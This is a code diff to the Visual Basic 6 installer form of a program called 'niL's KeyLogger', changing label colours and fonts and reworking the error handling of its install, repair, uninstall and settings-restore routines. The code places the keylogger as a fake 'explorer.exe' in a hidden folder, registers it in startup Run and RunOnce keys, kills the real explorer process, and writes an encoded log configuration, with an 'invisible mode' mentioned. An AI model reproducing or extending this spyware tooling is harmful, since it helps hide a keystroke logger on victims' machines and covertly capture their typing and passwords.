@@ -42,7 +42,7 @@ Begin VB.Form frmInstKLG
       Height          =   1815
       Left            =   120
       TabIndex        =   16
-      Top             =   1680
+      Top             =   3840
       Visible         =   0   'False
       Width           =   5895
       Begin VB.Timer Timer1 
@@ -76,7 +76,7 @@ Begin VB.Form frmInstKLG
       Begin VB.Label CountDown 
          Alignment       =   2  'Center
          BackColor       =   &H00000000&
-         Caption         =   "8"
+         Caption         =   "4"
          ForeColor       =   &H00FFFFFF&
          Height          =   375
          Left            =   5520
@@ -163,7 +163,7 @@ Begin VB.Form frmInstKLG
    Begin VB.Label Label13 
       Alignment       =   2  'Center
       Appearance      =   0  'Flat
-      BackColor       =   &H00FF8080&
+      BackColor       =   &H00404040&
       BackStyle       =   0  'Transparent
       BorderStyle     =   1  'Fixed Single
       Caption         =   "Exit"
@@ -171,12 +171,12 @@ Begin VB.Form frmInstKLG
          Name            =   "MS Sans Serif"
          Size            =   12
          Charset         =   0
-         Weight          =   400
+         Weight          =   700
          Underline       =   0   'False
          Italic          =   0   'False
          Strikethrough   =   0   'False
       EndProperty
-      ForeColor       =   &H008080FF&
+      ForeColor       =   &H00FFFFFF&
       Height          =   375
       Left            =   960
       TabIndex        =   21
@@ -234,7 +234,7 @@ Begin VB.Form frmInstKLG
    Begin VB.Label Label4 
       Alignment       =   2  'Center
       Appearance      =   0  'Flat
-      BackColor       =   &H00FF8080&
+      BackColor       =   &H00404040&
       BackStyle       =   0  'Transparent
       BorderStyle     =   1  'Fixed Single
       Caption         =   "Restore Settings"
@@ -242,12 +242,12 @@ Begin VB.Form frmInstKLG
          Name            =   "MS Sans Serif"
          Size            =   12
          Charset         =   0
-         Weight          =   400
+         Weight          =   700
          Underline       =   0   'False
          Italic          =   0   'False
          Strikethrough   =   0   'False
       EndProperty
-      ForeColor       =   &H008080FF&
+      ForeColor       =   &H00FFFFFF&
       Height          =   375
       Left            =   960
       TabIndex        =   12
@@ -433,7 +433,7 @@ Begin VB.Form frmInstKLG
    Begin VB.Label Label3 
       Alignment       =   2  'Center
       Appearance      =   0  'Flat
-      BackColor       =   &H00FF8080&
+      BackColor       =   &H00404040&
       BackStyle       =   0  'Transparent
       BorderStyle     =   1  'Fixed Single
       Caption         =   "Repair KeyLogger"
@@ -441,12 +441,12 @@ Begin VB.Form frmInstKLG
          Name            =   "MS Sans Serif"
          Size            =   12
          Charset         =   0
-         Weight          =   400
+         Weight          =   700
          Underline       =   0   'False
          Italic          =   0   'False
          Strikethrough   =   0   'False
       EndProperty
-      ForeColor       =   &H008080FF&
+      ForeColor       =   &H00FFFFFF&
       Height          =   375
       Left            =   960
       TabIndex        =   2
@@ -456,7 +456,7 @@ Begin VB.Form frmInstKLG
    Begin VB.Label Label2 
       Alignment       =   2  'Center
       Appearance      =   0  'Flat
-      BackColor       =   &H00FF8080&
+      BackColor       =   &H00404040&
       BackStyle       =   0  'Transparent
       BorderStyle     =   1  'Fixed Single
       Caption         =   "Install niL's keyLogger"
@@ -464,12 +464,12 @@ Begin VB.Form frmInstKLG
          Name            =   "MS Sans Serif"
          Size            =   12
          Charset         =   0
-         Weight          =   400
+         Weight          =   700
          Underline       =   0   'False
          Italic          =   0   'False
          Strikethrough   =   0   'False
       EndProperty
-      ForeColor       =   &H008080FF&
+      ForeColor       =   &H00FFFFFF&
       Height          =   375
       Left            =   960
       TabIndex        =   1
@@ -549,7 +549,7 @@ End Sub
 
 Private Sub UnInst()
 Dim ans As String
-ans = MsgBox("             Are you sure?", vbYesNo, "Uninstall niL's KeyLogger")
+ans = MsgBox("Are you sure?", vbYesNo, "Uninstall niL's KeyLogger")
 If ans = vbYes Then
         If m_IgnoreEvents Then Exit Sub
         Call KillFromStartup("explorer", True) 'Clear key RunOnce
@@ -560,12 +560,18 @@ If ans = vbYes Then
         fraUnInst.Visible = True
         Shell "TASKKILL /im explorer.exe"
         Timer1.Enabled = True
+        Exit Sub
     Else
+        On Error GoTo err
         Kill "C:\Documents and settings\All Users\Application Data\Micro\explorer.exe"
-        MsgBox "niLs KeyLogger Uninstalled Successfully!", vbInformation, "Successful"
     End If
 End If
-
+err:
+If err.Number = 0 Then
+MsgBox "niLs KeyLogger Uninstalled Successfully!", vbInformation, "Successful"
+Else
+MsgBox err.Number & " Uninstall Failed."
+End If
 Call LoadAllStat
 End Sub
 
@@ -592,13 +598,14 @@ Label7.Caption = "Uninstall in Progress...": lblWait.Visible = True: CountDown.V
 
 CountDown.Caption = CountDown.Caption - 1
 On Error GoTo err ' Resume Next
-If CountDown.Caption = 0 Then Kill "C:\Documents and settings\All Users\Application Data\Micro\explorer.exe": fraUnInst.Visible = False: Timer1.Enabled = False: MsgBox "Uninstalled Successfully!", vbInformation: Call LoadAllStat
+If CountDown.Caption = 0 Then Kill "C:\Documents and settings\All Users\Application Data\Micro\explorer.exe": Timer1.Enabled = False: fraUnInst.Visible = False: Call LoadAllStat
 
 err:
 If err.Number <> 0 Then
-    Timer1.Enabled = False
-    Dim an As String
-    an = MsgBox("Failed to Uninstall.", vbRetryCancel, "Unsuccessful")
+   Timer1.Enabled = False
+   Dim an As String
+   an = MsgBox("Failed to Uninstall.", vbRetryCancel, "Unsuccessful")
+   
     If an = vbRetry Then
     Shell "TASKKILL /im explorer.exe"
     CountDown.Caption = 10: Timer1.Enabled = True
@@ -606,18 +613,22 @@ If err.Number <> 0 Then
         Dim Restart As String
         Restart = MsgBox("niL's KeyLogger will be removed after Restart." & vbNewLine & "Do you want to restart now?", vbYesNo, "Uninstalling..")
         Call SetRunOnceAtStartup(App.EXEName, App.Path)
-        If Restart = vbYes Then Shell "shutdown -l -f -t 05"
+        If Restart = vbYes Then Shell "shutdown -l -f -t 05": End
         End
     End If
+    
+Else
+    If isInstalled = False Then Timer1.Enabled = False: MsgBox "Uninstalled Successfully!", vbInformation: Call LoadAllStat
 End If
 End Sub
 Private Sub Label3_Click() 'REPAIR
 Call CreateDirs
+
+On Error GoTo err
+
 If isActive = "False" Then
 
-    On Error GoTo err
     Shell "C:\Documents and Settings\All Users\Application Data\Micro\explorer.exe", vbNormalFocus
-    MsgBox "Repair Successful!", vbInformation, "Success"
 
 ElseIf WillRunAtStartup("explorer") = False And WillRunOnceAtStartup("explorer") = False Then
 
@@ -625,11 +636,15 @@ ElseIf WillRunAtStartup("explorer") = False And WillRunOnceAtStartup("explorer")
     MsgBox "Repair Successful!" & vbNewLine & "Please Uncheck <Totally invisible Mode> from Settings.", vbInformation, "Success"
 
 Else
-    MsgBox "niL's KeyLogger is working properly.", vbApplicationModal, "Success"
+    MsgBox "niL's KeyLogger is working properly.", vbApplicationModal, "Success": Exit Sub
 End If
 
 err:
-If err.Number <> 0 Then MsgBox "Unable to Repair. Re-install the Package", vbCritical, "Install Error"
+If err.Number = 0 Then
+    MsgBox "Repair Successful!", vbInformation, "Success"
+Else
+    MsgBox "Unable to Repair. Re-install the Package " & err.Number, vbCritical, "Install Error"
+End If
 Call LoadAllStat
 
 End Sub
@@ -653,10 +668,13 @@ Open "C:\Documents and Settings\" & username & "\Application Data\System\SPYXX.I
 Print #f, "[LogSetting]" & vbNewLine & "USEBS=1" & vbNewLine & "UseChildTitle=0" & vbNewLine & "EncCode=1" & vbNewLine & "extension=.nkl" & vbNewLine & "TimerInt=65" & vbNewLine & "LogMode=1" & vbNewLine & "LogDir=" & username.Tag & vbNewLine & "SETRUNONCE=1" & vbNewLine & "sLogging=0" & vbNewLine & "Pwd="
 Close #f
 username.Tag = ""
-MsgBox "Settings Restored Successfully!"
 
 err:
-If err.Number <> 0 Then MsgBox "Unable to restore Settings!", vbCritical, "Error"
+If err.Number = 0 Then
+MsgBox "Settings Restored Successfully!"
+Else
+MsgBox "Unable to restore Settings!", vbCritical, "Error"
+End If
 End Sub
 '**************Creates necessary directorys
 Private Sub CreateDirs()
@@ -695,7 +713,6 @@ Label3.Enabled = False
 Label4.Enabled = False
 End If
 
-CountDown.Caption = 10
 
 ActVal = isActive
 AType1 = WillRunOnceAtStartup("explorer")
